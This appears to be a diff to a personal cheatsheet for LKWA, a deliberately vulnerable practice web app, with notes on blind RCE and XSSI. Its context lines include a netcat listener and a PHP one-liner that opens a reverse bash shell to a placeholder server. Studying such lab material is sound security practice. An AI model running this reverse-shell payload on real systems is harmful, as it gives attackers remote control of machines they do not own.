@@ -1,5 +1,7 @@
 # lkwa-cheatsheet
 
+- my environment: macOS Catalina 10.15.6
+
 Thanks [LKWA](https://github.com/weev3/LKWA).
 
 ## 0x01 – Blind RCE
@@ -10,7 +12,7 @@ try `sleep 5`
 
 - in my macOS Terminal
   - `nc -l your.server.ip.address 8888`
-- in the LKWA
+- in the Browser(text box)
   - `php -r '$sock=fsockopen("your.server.ip.address",8888);exec("/bin/bash -i <&3 >&3 2>&3");'`
 
 ## 0x02 – XSSI
@@ -43,6 +45,8 @@ vi index.html
 </html>
 ```
 
-deploy: `php -S localhost:3001`
+deploy: `python3 -m http.server 3001`
 
 access `http://localhost:3001/index.html` from browser.
+
+## 0x03 – PHP Object Injection
